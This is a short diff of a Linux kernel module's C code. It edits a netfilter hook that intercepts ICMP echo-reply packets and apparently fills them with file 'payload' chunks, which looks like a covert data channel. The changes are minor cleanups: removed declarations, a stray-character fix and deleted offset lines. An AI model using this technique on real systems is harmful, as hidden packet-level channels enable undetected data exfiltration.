@@ -10,9 +10,6 @@
 
 static struct nf_hook_ops netfilter_hook;
 
-static void register_hook(void);
-static void unregister_hook(void);
-
 get_payload_func_t get_payload_func = NULL;
 
 /**
@@ -46,7 +43,7 @@ unsigned int nf_sendfile_hook(void *priv,
     if (NULL == get_payload_func) {
         // as long as we don't have a way to get our payloads, we don't 
         // have much to do.
-`        return NF_ACCEPT;
+        return NF_ACCEPT;
     }
 
     struct iphdr *ip_layer = ip_hdr(skb);
@@ -60,11 +57,7 @@ unsigned int nf_sendfile_hook(void *priv,
         // ignore any non-ICMP-echoreply packets.
         return NF_ACCEPT;
     }
-
-    unsigned int icmp_data_offset = sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMPHDR_TIMESTAMP_FIELD_SIZE;
-    __u8* icmp_data = skb->data + icmp_data_offset;
-    ssize_t icmp_data_length = skb->len - icmp_data_offset;
-
+    
     size_t default_payload_size = get_default_payload_chunk_size();
     size_t actual_payload_size = 0;
     char* payload_data = (char*)kmalloc(default_payload_size, GFP_KERNEL);
